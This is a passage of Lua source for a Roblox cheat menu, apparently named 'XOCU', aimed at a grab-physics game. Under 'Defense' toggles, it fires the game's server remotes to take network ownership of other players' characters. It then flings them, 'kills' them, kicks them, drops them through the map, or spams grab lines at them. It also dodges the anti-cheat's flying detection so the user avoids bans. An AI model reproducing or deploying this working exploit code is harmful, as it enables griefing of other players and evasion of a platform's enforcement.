                        char:BreakJoints() 
                        hum.Health = 0
                    end
                end
            end)
        end
    end
})
DefenseGroup:CreateToggle({
    Name = "Auto Leave ",
    Flag = "Auto Leave",
    Default = false,
    Callback = function(v)
        SetToggleState("Auto Leave", v)
        
        -- Clear old connection to prevent memory leaks or duplicate firing
        if _G.AutoLeaveCon then _G.AutoLeaveCon:Disconnect() end

        if v then
            local warnTimestamps = {} -- Table to track when warnings happen

            _G.AutoLeaveCon = game:GetService("ReplicatedStorage").GameCorrectionEvents.GameCorrectionsNotify.OnClientEvent:Connect(function(r)
                if r == "Flying" then
                    local currentTime = os.clock()
                    table.insert(warnTimestamps, currentTime)

                    -- Clean up timestamps that are older than 1 second
                    for i = #warnTimestamps, 1, -1 do
                        if currentTime - warnTimestamps[i] > 1 then
                            table.remove(warnTimestamps, i)
                        end
                    end

                    -- If 3 or more warnings happened in the last second, auto-leave
                    if #warnTimestamps >= 3 then
                        game:GetService("Players").LocalPlayer:Kick("XOCU Safety: Disconnected to prevent ban.")
                    end
                end
            end)
        end
    end
})
DefenseGroup:CreateToggle({
    Name = "Anti Void",
        Flag = "Anti Void",
    Default = false,
    Callback = function(v)
        SetToggleState("Anti Void", Value)
        if v then
            workspace.FallenPartsDestroyHeight = 0/0
        else
            workspace.FallenPartsDestroyHeight = -100
        end
    end
})

local RunService = game:GetService("RunService")
local plr = game:GetService("Players").LocalPlayer
local rs = game:GetService("ReplicatedStorage")

local notifyCooldowns = {}
local AntiBlobConnection = nil
local AntiBlobT = false

function CheckBlob(blob, myHRP, myAttach, humanoid, source)
    local script = blob:FindFirstChild("BlobmanSeatAndOwnerScript")
    if not script then return end

    for _, side in ipairs({"Left", "Right"}) do
        local detector = blob:FindFirstChild(side .. "Detector")
        if not detector then continue end

        local weld = detector:FindFirstChild(side .. "Weld")
        local align = detector:FindFirstChild(side .. "AlignOrientation")

        if weld and weld:IsA("AlignPosition") and weld.Attachment0 == myAttach then
            local msg = source .. " → " .. side .. " Grab"
            local now = tick()

            if not notifyCooldowns[msg] or (now - notifyCooldowns[msg]) >= 2 then
    notifyCooldowns[msg] = now
    notify("[ ✊ ]", msg, 3)
            end

            local success, errorMsg = pcall(function()
                rs.CharacterEvents.RagdollRemote:FireServer(myHRP, 0)

                local myChar = plr.Character
                if not myChar then return end

                local myHD = myChar:FindFirstChild("Head")
                local myLA = myChar:FindFirstChild("Left Arm")
                local myRA = myChar:FindFirstChild("Right Arm")
                local myLL = myChar:FindFirstChild("Left Leg")
                local myLR = myChar:FindFirstChild("Right Leg")

                if humanoid then
                    humanoid.PlatformStand = true
                end

                local bodyParts = {}

                if myHRP then table.insert(bodyParts, myHRP) end
                if myHD then table.insert(bodyParts, myHD) end
                if myLA then table.insert(bodyParts, myLA) end
                if myRA then table.insert(bodyParts, myRA) end
                if myLL then table.insert(bodyParts, myLL) end
                if myLR then table.insert(bodyParts, myLR) end

                for _, part in ipairs(bodyParts) do
                    part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                end

                align.Attachment0 = nil
                weld.Attachment0 = nil
                weld.Enabled = false
                align.Enabled = false

                for _, part in ipairs(bodyParts) do
                    part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                end

                weld.Enabled = true
                align.Enabled = true

                if humanoid then
                    humanoid.PlatformStand = false
                end

                for _, part in ipairs(bodyParts) do
                    part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                end
            end)

            if not success then
                warn("CheckBlob: " .. errorMsg)
            end
        end
    end
end

function AntiBlobF()
    if AntiBlobConnection then
        AntiBlobConnection:Disconnect()
        AntiBlobConnection = nil
    end

    AntiBlobConnection = RunService.Stepped:Connect(function()
        if not AntiBlobT then
            if AntiBlobConnection then
                AntiBlobConnection:Disconnect()
                AntiBlobConnection = nil
            end
            return
        end

        local myChar = plr.Character
        if not myChar then return end
        local humanoid = myChar:FindFirstChild("Humanoid")
        local myHRP = myChar:FindFirstChild("HumanoidRootPart")

        local myAttach = myHRP and myHRP:FindFirstChild("RootAttachment")

        if not (myHRP and myAttach) then
            return
        end

        local inv = workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
        if inv then
            for _, blob in ipairs(inv:GetChildren()) do
                if blob.Name == "CreatureBlobman" then
                    local occupantName = "{me}"
                    local vehicleSeat = blob:FindFirstChild("VehicleSeat")
                    if vehicleSeat and vehicleSeat.Occupant then
                        local character = vehicleSeat.Occupant.Parent
                        if character then
                            local player = game.Players:GetPlayerFromCharacter(character)
                            if player then
                                occupantName = player.Name
                            end
                        end
                    end
                    CheckBlob(blob, myHRP, myAttach, humanoid, occupantName)
                end
            end
        end

        for _, player in ipairs(game.Players:GetPlayers()) do
            if player ~= plr then
                local invs = workspace:FindFirstChild(player.Name .. "SpawnedInToys")
                if invs then
                    for _, blob in ipairs(invs:GetChildren()) do
                        if blob.Name == "CreatureBlobman" then
                            local occupantName = player.Name
                            local vehicleSeat = blob:FindFirstChild("VehicleSeat")
                            if vehicleSeat and vehicleSeat.Occupant then
                                local character = vehicleSeat.Occupant.Parent
                                if character then
                                    local occupantPlayer = game.Players:GetPlayerFromCharacter(character)
                                    if occupantPlayer then
                                        occupantName = occupantPlayer.Name
                                    end
                                end
                            end
                            CheckBlob(blob, myHRP, myAttach, humanoid, occupantName)
                        end
                    end
                end
            end
        end

        local plots = workspace:FindFirstChild("PlotItems")
        if plots then
            for i = 1, 5 do
                local plot = plots:FindFirstChild("Plot" .. i)
                if plot then
                    for _, blob in ipairs(plot:GetChildren()) do
                        if blob.Name == "CreatureBlobman" then
                            local occupantName = "Plot " .. i
                            local vehicleSeat = blob:FindFirstChild("VehicleSeat")
                            if vehicleSeat and vehicleSeat.Occupant then
                                local character = vehicleSeat.Occupant.Parent
                                if character then
                                    local player = game.Players:GetPlayerFromCharacter(character)
                                    if player then
                                        occupantName = player.Name
                                    end
                                end
                            end
                            CheckBlob(blob, myHRP, myAttach, humanoid, occupantName)
                        end
                    end
                end
            end
        end
    end)
end

DefenseGroup:CreateToggle({
    Name = "Anti Blob",
    Flag = "AntiBlobKick",
    Default = false,
    Callback = function(Value)
        AntiBlobT = Value
        if AntiBlobT then
            AntiBlobF()
        end
    end,
})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Fix 1: Pull helper functions OUTSIDE the callback to prevent memory leaks
local function OAA_getCharacter(player)
    return player.Character
end

local function OAA_getHumanoidRootPart(character)
    return character and character:FindFirstChild("HumanoidRootPart")
end

local function OAA_getHumanoid(character)
    return character and character:FindFirstChild("Humanoid")
end

local function OAA_getDistance(part1, part2)
    return (part1.Position - part2.Position).Magnitude
end

local function OAA_setNetworkOwner(part, cframe)
    task.spawn(function()
        -- Use FindFirstChild/WaitForChild safely
        local grabEvents = ReplicatedStorage:FindFirstChild("GrabEvents")
        if grabEvents then
            local setNetworkOwnerRemote = grabEvents:FindFirstChild("SetNetworkOwner")
            if setNetworkOwnerRemote then
                setNetworkOwnerRemote:FireServer(part, cframe)
            end
        end
    end)
end

-- Fix 2: Prevent DescendantAdded from stacking multiple connections
local antiBlob1T = false
local blobConnection = nil

local function antiBlob1F()
    antiBlob1T = true
    if not blobConnection then
        blobConnection = workspace.DescendantAdded:Connect(function(toy)
            if toy.Name == "CreatureBlobman" and antiBlob1T then
                -- Wait for child prevents errors if the detectors haven't loaded the exact microsecond the model spawns
                local leftDetector = toy:WaitForChild("LeftDetector", 3)
                local rightDetector = toy:WaitForChild("RightDetector", 3)
                
                if leftDetector then leftDetector:Destroy() end
                if rightDetector then rightDetector:Destroy() end
            end
        end)
    end
end

-- Fix 3: Use a connection variable to cleanly start/stop the Aura loop
local auraConnection = nil

DefenseGroup:CreateToggle({
    Name = "Anti-Blobman Aura",
    Flag = "Anti-Blobman Aura",
    Default = false,
    Callback = function(enabled)
        -- Fix 4: Changed 'Value' to 'enabled'
        if SetToggleState then
            SetToggleState("Anti-Blobman Aura", enabled)
        end

        if enabled then
            -- Clean up old loop just in case
            if auraConnection then auraConnection:Disconnect() end
            
            -- Use Heartbeat for smooth, constant checking without freezing the UI thread
            auraConnection = RunService.Heartbeat:Connect(function()
                local myCharacter = OAA_getCharacter(LocalPlayer)
                local myRootPart = OAA_getHumanoidRootPart(myCharacter)

                if not myRootPart then return end -- Skip if we are dead/respawning

                for _, player in pairs(Players:GetPlayers()) do
                    if player ~= LocalPlayer then
                        local playerCharacter = OAA_getCharacter(player)
                        local playerRootPart = OAA_getHumanoidRootPart(playerCharacter)
                        local playerHumanoid = OAA_getHumanoid(playerCharacter)

                        if playerRootPart and playerHumanoid and playerHumanoid.SeatPart then
                            local seatParent = playerHumanoid.SeatPart.Parent
                            
                            -- Check if riding Blobman and within range
                            if seatParent and seatParent.Name == "CreatureBlobman" then
                                if OAA_getDistance(playerRootPart, myRootPart) <= 19 then
                                    OAA_setNetworkOwner(playerRootPart, playerRootPart.CFrame)
                                end
                            end
                        end
                    end
                end
            end)
        else
            -- Disconnect the loop cleanly when toggled off
            if auraConnection then
                auraConnection:Disconnect()
                auraConnection = nil
            end
        end
    end,
})
local antiExplodeT = false
local function antiExplodeF()
	antiExplodeT = true
	local char = Player.Character
	if not char then
		return
	end
	local hrp = char:WaitForChild("HumanoidRootPart")
	workspace.ChildAdded:Connect(function(model)
		if model.Name == "Part" and antiExplodeT then
			local mag = (model.Position - hrp.Position).Magnitude
			if mag <= 20 then
				hrp.Anchored = true
				wait(0.01)
				while char["Right Arm"].RagdollLimbPart.CanCollide do
					wait(0.001)
				end
				hrp.Anchored = false
			end
		end
	end)
end
DefenseGroup:CreateToggle({
	Name = "Anti Explosion",
        Flag = "Anti Explosion", 
	Default = false,
	Callback = function(on)
        SetToggleState("Anti Explosion", on)
		if on then
			antiExplodeF()
		else
			antiExplodeT = false
		end
	end
})
local hookBurnConn
local function hookBurn(char)
	local hum = char:WaitForChild("Humanoid")
	local hrp = char:WaitForChild("HumanoidRootPart")
	char.PrimaryPart = hrp
	if hookBurnConn then
		hookBurnConn:Disconnect()
	end
	hookBurnConn = hum.FireDebounce.Changed:Connect(function(isBurning)
		if isBurning then
			local me = char
			local oldCF = hrp.CFrame
			local plots = workspace:FindFirstChild("Plots")
			if plots and plots:FindFirstChild("Plot2") then
				local plot2 = plots.Plot2
				local barrier = plot2:FindFirstChild("Barrier")
				local pb = barrier and barrier:FindFirstChild("PlotBarrier")
				if pb and pb:IsA("BasePart") then
					local safeCF = pb.CFrame * CFrame.new(0, 6, 0)
					me:SetPrimaryPartCFrame(safeCF)
					task.wait(0.3)
					local firePart = me:FindFirstChild("FirePlayerPart", true)
					if firePart then
						for _, obj in ipairs(firePart:GetChildren()) do
							if obj:IsA("Sound") then
								obj:Stop()
							end
							if obj:IsA("Light") or obj:IsA("ParticleEmitter") then
								obj.Enabled = false
							end
						end
						if firePart:FindFirstChild("CanBurn") then
							firePart.CanBurn.Value = false
						end
						if hum:FindFirstChild("FireDebounce") then
							hum.FireDebounce.Value = false
						end
					end
					task.wait(0.6)
					if me and me.PrimaryPart then
						me:SetPrimaryPartCFrame(oldCF)
					end
				end
			end
		end
	end)
end
DefenseGroup:CreateToggle({
	Name = "Anti Burn",
        Flag = "Anti Burn",
	Default = false,
	Callback = function(on)
        SetToggleState("Anti Burn", on)
		if on then
			hookBurn(Player.Character)
		elseif hookBurnConn then
			hookBurnConn:Disconnect()
		end
	end
})

local antiStickyT = false
DefenseGroup:CreateToggle({
	Name = "Anti Sticky",
        Flag = "Anti Sticky",
	Default = false,
	Callback = function(Value)
        SetToggleState("Anti Sticky", Value)
		antiStickyT = Value
		if Player.PlayerScripts:FindFirstChild("StickyPartsTouchDetection") then
			Player.PlayerScripts.StickyPartsTouchDetection.Disabled = Value
		end
	end,
})

DefenseGroup:CreateToggle({
	Name = "Anti Lag",
        Flag = "Anti Lag",
	Default = false,
	Callback = function(Value)
        SetToggleState("Anti Lag", Value)
		if Value then
			local grabFolder = ReplicatedStorage:FindFirstChild("GrabEvents")
            -- ... (original deletion logic) ...
		else
			-- ... (original restoration logic) ...
		end
	end,
})

DefenseGroup:CreateToggle({
	Name = "Anti Paint",
        Flag = "Anti Paint",
	Default = false,
	Callback = function(state)
        SetToggleState("Anti Paint", state)
		if state then
			deleteAllPaintParts()
			watchNewPaintParts()
			setTouchQuery(false)
		else
			restorePaintParts()
			disconnectWatchers()
			setTouchQuery(true)
		end
	end
})

do

    local defenseEnabled = false
    local defenseConnection = nil
    local defenseMode = "Fling"
    local crazyline = false
    local crazylineTask = nil

    local GrabEvents = game:GetService("ReplicatedStorage"):WaitForChild("GrabEvents")
    local SetNetworkOwner = GrabEvents:WaitForChild("SetNetworkOwner")
    local DestroyGrabLine = GrabEvents:FindFirstChild("DestroyGrabLine")
    local CreateGrabEvent = GrabEvents:FindFirstChild("CreateGrabLine")
    local Debris = game:GetService("Debris")

    local function getAttacker()
        local char = LocalPlayer.Character
        if not char or not char:FindFirstChild("Head") then
            return nil
        end
        local owner = char.Head:FindFirstChild("PartOwner")
        if not owner or not owner:IsA("StringValue") then
            return nil
        end
        return game:GetService("Players"):FindFirstChild(owner.Value)
    end

    local function performFling(attacker)
        if not attacker or not attacker.Character then return end
        local root = attacker.Character:FindFirstChild("HumanoidRootPart")
        if not root then return end
        pcall(function()
            SetNetworkOwner:FireServer(root, root.CFrame)
            if DestroyGrabLine then
                DestroyGrabLine:FireServer(root)
            end
            local away = (root.Position - LocalPlayer.Character.HumanoidRootPart.Position).Unit
            away = Vector3.new(away.X, 0, away.Z) * 90000
            local bv = Instance.new("BodyVelocity")
            bv.Name = "RinneganFling"
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = away
            bv.P = 12500
            bv.Parent = root
            Debris:AddItem(bv, 0.01)
        end)
    end

    local function performKill(attacker)
        if not attacker or not attacker.Character then return end
        local root = attacker.Character:FindFirstChild("HumanoidRootPart")
        if not root then return end
        pcall(function()
            SetNetworkOwner:FireServer(root, root.CFrame)
            if DestroyGrabLine then
                DestroyGrabLine:FireServer(root)
            end
            local away = (root.Position - LocalPlayer.Character.HumanoidRootPart.Position).Unit
            away = Vector3.new(away.X, 0, away.Z) * 99999999999999
            local bv = Instance.new("BodyVelocity")
            bv.Name = "RinneganFling"
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = away
            bv.P = 12500
            bv.Parent = root
            Debris:AddItem(bv, 0.01)
        end)
    end

    local function performHeaven(attacker)
        if not attacker or not attacker.Character then return end
        local root = attacker.Character:FindFirstChild("HumanoidRootPart")
        if not root then return end
        pcall(function()
            SetNetworkOwner:FireServer(root, root.CFrame)
            if DestroyGrabLine then
                DestroyGrabLine:FireServer(root)
            end
            root.CFrame = CFrame.new(0, 200, 0)
            local bv = Instance.new("BodyVelocity")
            bv.Name = "RinneganHeaven"
            bv.MaxForce = Vector3.new(0, math.huge, 0)
            bv.Velocity = Vector3.new(0, 200, 0)
            bv.P = 12500
            bv.Parent = root
            Debris:AddItem(bv, 0.01)
        end)
    end

    local function performKick(attacker)
        if not attacker or not attacker.Character then return end
        local root = attacker.Character:FindFirstChild("HumanoidRootPart")
        if not root then return end
        pcall(function()
            SetNetworkOwner:FireServer(root, root.CFrame)
            if DestroyGrabLine then
                DestroyGrabLine:FireServer(root)
            end
            root.CFrame = CFrame.new(0, 999999999999, 0)
            local bv = Instance.new("BodyVelocity")
            bv.Name = "RinneganHeaven"
            bv.MaxForce = Vector3.new(0, math.huge, 0)
            bv.Velocity = Vector3.new(0, 99999999999999, 0)
            bv.P = 12500
            bv.Parent = root
            Debris:AddItem(bv, 0.01)
        end)
    end

    local function performRagdoll(attacker)
        if not attacker or not attacker.Character then return end
        local root = attacker.Character:FindFirstChild("HumanoidRootPart")
        if not root then return end
        pcall(function()
            SetNetworkOwner:FireServer(root, root.CFrame)
            if DestroyGrabLine then
                DestroyGrabLine:FireServer(root)
            end
            local bv = Instance.new("BodyVelocity")
            bv.Name = "RinneganSpy"
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = Vector3.new(0, -20, 0)
            bv.P = 12500
            bv.Parent = root
            Debris:AddItem(bv, 0.01)
        end)
    end

    local function performHell(attacker)
        if not attacker or not attacker.Character then return end
        local root = attacker.Character:FindFirstChild("HumanoidRootPart")
        if not root then return end
        pcall(function()
            SetNetworkOwner:FireServer(root, root.CFrame)
            if DestroyGrabLine then
                DestroyGrabLine:FireServer(root)
            end
            for _, part in ipairs(attacker.Character:GetDescendants()) do
                if part:IsA("BasePart") and not part.Anchored then
                    part.CanCollide = false
                end
            end
            local bv = Instance.new("BodyVelocity")
            bv.Name = "RinneganSpy"
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Velocity = Vector3.new(0, -100000000, 0)
            bv.P = 12500
            bv.Parent = root
            local noclipConnection
            noclipConnection = game:GetService("RunService").Heartbeat:Connect(function()
                if not attacker.Character or not attacker.Character.Parent then
                    noclipConnection:Disconnect()
                    return
                end
                for _, part in ipairs(attacker.Character:GetDescendants()) do
                    if part:IsA("BasePart") and not part.Anchored then
                        part.CanCollide = false
                    end
                end
            end)
            task.delay(0.01, function()
                if noclipConnection then
                    noclipConnection:Disconnect()
                end
            end)
            Debris:AddItem(bv, 0.01)
        end)
    end

    local function performChina(attacker)
        if not attacker or not attacker.Character then return end
        local root = attacker.Character:FindFirstChild("HumanoidRootPart")
        if not root then return end
        pcall(function()
            SetNetworkOwner:FireServer(root, root.CFrame)
            if DestroyGrabLine then
                DestroyGrabLine:FireServer(root)
            end
            root.CFrame = CFrame.new(591, 153, -101)
        end)
    end

    local function performSpamGrabLines(attacker)
        while crazyline do
            pcall(function()
                local char = LocalPlayer.Character
                if char then
                    local head = char:FindFirstChild("Head")
                    if head then
                        local owner = head:FindFirstChild("PartOwner")
                        if owner and owner:IsA("StringValue") then
                            local attacker = game:GetService("Players"):FindFirstChild(owner.Value)
                            if attacker and attacker.Character then
                                local attackerHead = attacker.Character:FindFirstChild("Head")
                                local attackerHRP = attacker.Character:FindFirstChild("HumanoidRootPart")
                                if attackerHead and attackerHRP then
                                    for i = 1, 10 do
                                        pcall(function()
                                            CreateGrabEvent:FireServer(attackerHead, attackerHead.CFrame)
                                        end)
                                    end
                                    for i = 1, 10 do
                                        pcall(function()
                                            CreateGrabEvent:FireServer(attackerHRP, attackerHRP.CFrame)
                                        end)
                                    end
                                end
                            end
                        end
                    end
                end
            end)
            task.wait(0.01)
        end
    end

    local function startDefense()
        if defenseConnection then
            return
        end
        defenseConnection = game:GetService("RunService").Heartbeat:Connect(function()
            if not defenseEnabled then
                return
            end
            local attacker = getAttacker()
            if not attacker then
                return
            end
            if defenseMode == "Fling" then
                performFling(attacker)
            elseif defenseMode == "Kill" then
                performKill(attacker)
            elseif defenseMode == "Send to Heaven" then
                performHeaven(attacker)
            elseif defenseMode == "Kick" then
                performKick(attacker)
            elseif defenseMode == "Ragdoll" then
                performRagdoll(attacker)
            elseif defenseMode == "Hell" then
                performHell(attacker)
            elseif defenseMode == "China" then
                performChina(attacker)
            elseif defenseMode == "GrabLine" then
                if not crazylineTask then
                    crazyline = true
                    crazylineTask = task.spawn(performSpamGrabLines)
                end
            end
        end)
    end

    local function stopDefense()
        if defenseConnection then
            defenseConnection:Disconnect()
            defenseConnection = nil
        end
        crazyline = false
        if crazylineTask then
            task.cancel(crazylineTask)
            crazylineTask = nil
        end
        for _, plr in ipairs(game:GetService("Players"):GetPlayers()) do
            local char = plr.Character
            if char then
                for _, obj in ipairs(char:GetDescendants()) do
                    if obj:IsA("BodyVelocity") and (obj.Name == "RinneganFling" or obj.Name == "RinneganHeaven" or obj.Name == "RinneganSpy") then
                        obj:Destroy()
                    end
                end
            end
        end
    end

    LocalPlayer.CharacterAdded:Connect(function()
        if defenseEnabled then
            task.wait(1)
            startDefense()
        end
    end)

    DefenseGroup:CreateToggle({
        Name = "Counter Attacks",
        Default = false,
        Callback = function(Value)
            defenseEnabled = Value
            if Value then
                startDefense()
            else
                stopDefense()
            end
        end
    })

    DefenseGroup:CreateDropdown({
        Name = "Attack Mode",
        Items = {"Fling", "Kill", "Send to Heaven", "Kick", "Ragdoll", "Hell", "China", "GrabLine"},
        Default = "Fling",
        Callback = function(Value)
            defenseMode = Value
        end
    })
end

local platformTPToggle = false
local platformTPActive = false
local platformPart = nil
local oldPlatformPos = nil

local function SetupPlatform()
    if not platformPart then
        platformPart = Instance.new("Part", workspace)
        platformPart.Name = "SkyBase"
        platformPart.Anchored = true
        platformPart.Size = Vector3.new(1500, 2, 1500)
        platformPart.CFrame = CFrame.new(0, 1000000, 0)
        workspace.FallenPartsDestroyHeight = -9999999
    end
end

DefenseExtra:CreateToggle({
    Name = "Enable Platform TP",
    Flag = "PlatformTPToggle",
    Default = false,
    Callback = function(Value)
        SetToggleState("PlatformTPToggle", Value)
        platformTPToggle = Value
        if Value then
            SetupPlatform()
        else
            platformTPActive = false
        end
    end
})

DefenseExtra:CreateKeybind({
    Name = "Platform TP Execute",
    Flag = "PlatformTPKey",
    Default = "X",
    Callback = function()
        if not platformTPToggle then return end
        
        local char = Player.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not root then return end

        platformTPActive = not platformTPActive

        if platformTPActive then
            oldPlatformPos = root.CFrame
            root.CFrame = platformPart.CFrame + Vector3.new(0, 5, 0)
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
        else
            if oldPlatformPos then
                root.CFrame = oldPlatformPos
            end
        end
    end
})

DefenseExtra:CreateButton({
    Name = "Delete Legs",
        Flag = "Delete Legs",
    Callback = function()
        local char = Player.Character
        if not char then return end
        if char:FindFirstChild("Left Leg") and char:FindFirstChild("Right Leg") then
            local ll = char:FindFirstChild("Left Leg")
            local rl = char:FindFirstChild("Right Leg")
            local void = workspace.FallenPartsDestroyHeight
            local pos = char.Torso.CFrame
            workspace.FallenPartsDestroyHeight = -100
            ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(char.HumanoidRootPart, 2)
            task.wait(0.5)
            rl.CFrame = CFrame.new(0, -10000, 0)
            ll.CFrame = CFrame.new(0, -10000, 0)
            task.wait(0.3)
            char.Torso.CFrame = CFrame.new(0, -9970, 0)
            task.wait(0.5)
            char.Torso.CFrame = pos
            task.wait(0.5)
            workspace.FallenPartsDestroyHeight = void
            task.spawn(function()
                if not char:FindFirstChild("Left Leg") and not char:FindFirstChild("Right Leg") then
                    while task.wait() do
                        if Player.PlayerGui.ControlsGui.PCFrame.Stand.Visible == false then
                            char.Humanoid.HipHeight = 2
                        else
                            char.Humanoid.HipHeight = 0
                        end
                    end
                end
            end)
        end
    end
})

do

    local ToyList = {
        ["Coconut"] = "FoodCoconut",
        ["Banana"] = "FoodBanana",
        ["Fries"] = "FoodFrenchFries",
        ["MeatStick"] = "FoodMeatStick",
        ["Poop"] = "PoopPile",
        ["Donut"] = "FoodDonut",
        ["Cake"] = "FoodCakePink",
        ["Burger"] = "FoodHamburger",
        ["Pizza"] = "FoodPizzaCheese",
        ["Hotdog"] = "FoodHotdog",
        ["Mushroom"] = "FoodMushroomPoison",
        ["Banjo"] = "InstrumentGuitarBanjo",
        ["Violin"] = "InstrumentGuitarViolin",
        ["Ukulele"] = "InstrumentGuitarUkulele",
        ["Sax"] = "InstrumentWoodwindSaxophone",
        ["Vuvuzela"] = "InstrumentBrassVuvuzela",
        ["Bongos"] = "InstrumentDrumBongos",
        ["Mic"] = "InstrumentVoiceMicrophone",
        ["Pepperoni"] = "FoodPizzaPepperoni",
        ["Piano"] = "InstrumentPianoMelodica",
        ["Bread"] = "FoodBread",
        ["Egg"] = "FoodDippyEgg",
        ["Mayo"] = "FoodMayonnaise",
        ["WhiteMug"] = "CupMugWhite",
        ["Ocarina"] = "InstrumentWoodwindOcarina",
        ["SparklePoop"] = "PoopPileSparkle",
        ["BrownMug"] = "CupMugBrown",
        ["Trumpet"] = "InstrumentBrassTrumpet",
        ["Snare"] = "InstrumentDrumSnare",
        ["Lyre"] = "InstrumentGuitarLyre",
    }

    local DropdownValues = {}
    for shortName, _ in pairs(ToyList) do
        table.insert(DropdownValues, shortName)
    end
    table.sort(DropdownValues)

    local SelectedToy = ToyList["Burger"]
    local instantLagActive = false
    local instantLagTask = nil

    function fixEndGrab()
        pcall(function()
            local grabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
            local existing = grabEvents:FindFirstChild("EndGrabEarly")
            if existing then existing:Destroy() end
            local s = Instance.new("RemoteEvent")
            s.Name = "EndGrabEarly"
            s.Parent = grabEvents
            s.OnClientEvent:Connect(function() end)
        end)
    end

    fixEndGrab()

    DefenseExtra:CreateDropdown({
        Name = "Select Input Lag Toy",
        Items = DropdownValues,
        Default = "Burger",
        Callback = function(Value)
            SelectedToy = ToyList[Value]
        end
    })

    DefenseExtra:CreateToggle({
        Name = "Anti Input Lag",
        Default = false,
        Callback = function(Value)
            instantLagActive = Value

            if instantLagTask then
                task.cancel(instantLagTask)
                instantLagTask = nil
            end

            if Value then
                instantLagTask = task.spawn(function()
                    local plr = LocalPlayer
                    local RS = ReplicatedStorage
                    local SpawnRemote = RS:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")
                    local DestroyToy = RS:WaitForChild("MenuToys"):WaitForChild("DestroyToy")
                    local SetNetOwner = RS:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
                    local GrabEvents = RS:WaitForChild("GrabEvents")

                    local HoldDuration = 0.02
                    local CycleSpeed = 0.02

                    while instantLagActive do
                        local char = plr.Character
                        local hrp = char and char:FindFirstChild("HumanoidRootPart")

                        if hrp then
                            local toysFolder = workspace:FindFirstChild(plr.Name.."SpawnedInToys")
                            local name = SelectedToy
                            local item = toysFolder and toysFolder:FindFirstChild(name)

                            if not item or not item.Parent then
                                task.spawn(function()
                                    pcall(function()
                                        SpawnRemote:InvokeServer(name, hrp.CFrame * CFrame.new(0, -12, 0), Vector3.zero)
                                    end)
                                end)
                                task.wait(0.1)
                            else
                                local holdPart = item:FindFirstChild("HoldPart")
                                if holdPart then
                                    for _, v in pairs(item:GetDescendants()) do
                                        if v:IsA("BasePart") then
                                            v.CanCollide = false
                                            v.Massless = true
                                        end
                                    end

                                    task.spawn(function()
                                        pcall(function()
                                            holdPart.HoldItemRemoteFunction:InvokeServer(item, char)
                                        end)
                                    end)

                                    task.wait(HoldDuration)

                                    task.spawn(function()
                                        pcall(function()
                                            holdPart.DropItemRemoteFunction:InvokeServer(
                                                item,
                                                CFrame.new(0, 5000, 0),
                                                Vector3.zero
                                            )
                                        end)
                                    end)
                                end
                            end
                        end
                        task.wait(CycleSpeed)
                    end
                end)
            end
        end
    })
end

DefenseExtra:CreateToggle({
        Name = "Break Pcld",
        Default = false,
        Callback = function(Value)
            local hkExpectDeath = false
            local hkSalmonList = {}
            hkSalmonList[LocalPlayer.UserId] = true
            
            local function hkApplySalmon(char)
                if not char then return end
                local newHum = char:WaitForChild("Humanoid", 5)
                if not newHum then return end
                if hkSalmonList[LocalPlayer.UserId] and not hkExpectDeath then
                    hkExpectDeath = true
                    newHum:ChangeState(Enum.HumanoidStateType.Dead)
                else
                    hkExpectDeath = false
                end
            end
            
            LocalPlayer.CharacterAdded:Connect(function(char)
                hkApplySalmon(char)
            end)
            
            hkSalmonList[LocalPlayer.UserId] = Value and true or nil
            if Value then
                hkExpectDeath = false
                local char = LocalPlayer.Character
                local hum = char and char:FindFirstChildOfClass("Humanoid")
                if hum then hum.Health = 0 end
            end
        end
    })


do
    Players = game:GetService("Players")
    RS = game:GetService("ReplicatedStorage")
    RunService = game:GetService("RunService")
    plr = Players.LocalPlayer

    -- State
    AntiKickItemActive = false
    MyPCLD = nil
    pcldConn = nil
    ToyList = {
        ["Japanese Lantern"] = "JapaneseLantern",
        ["Spray Can"]        = "SprayCanWD",
        ["Spooky Candle"]    = "SpookyCandle1",
    }

    DropdownValues = {}
    for shortName, _ in pairs(ToyList) do
        table.insert(DropdownValues, shortName)
    end
    table.sort(DropdownValues)

    local SelectedToy = ToyList["Spooky Candle"] or ToyList[DropdownValues[1]]

    DefenseExtra:CreateDropdown({
        Name = "anti kick item",
        Flag = "Input Lag Item",
        Items = DropdownValues,
        Default = "Spooky Candle", 
        Callback = function(Value)
            SelectedToy = ToyList[Value]
        end
    })

    local function GetMagnitude(Part1, Part2)
        return (Part1.Position - Part2.Position).Magnitude
    end

    local function FWD(parent, part, timeOffset)
        return parent:FindFirstChild(part) or parent:WaitForChild(part, timeOffset or 1)
    end

    local function CFP(parent, part)
        return parent:FindFirstChild(part) ~= nil  
    end

    local function CheckNetworkOwnerOnPart(Part) 
        local po = Part:FindFirstChild("PartOwner")
        return po and po.Value == plr.Name
    end

    local function sno(part)
        pcall(function()
            local grabEvents = RS:FindFirstChild("GrabEvents")
            local setNetOwner = grabEvents and grabEvents:FindFirstChild("SetNetworkOwner")
            if setNetOwner then
                setNetOwner:FireServer(part, part.CFrame)
            end
        end)
    end

    local function CheckForHome()
        local plotItems = workspace:FindFirstChild("PlotItems")
        local plots = workspace:FindFirstChild("Plots")
        
        if plots and plotItems then
            for i = 1, 5 do 
                local Plot = plots:FindFirstChild("Plot"..i)
                if Plot then
                    local sign = Plot:FindFirstChild("PlotSign")
                    local owners = sign and sign:FindFirstChild("ThisPlotsOwners")
                    if owners then
                        for _,v in pairs(owners:GetChildren()) do 
                            if v.Value == plr.Name then 
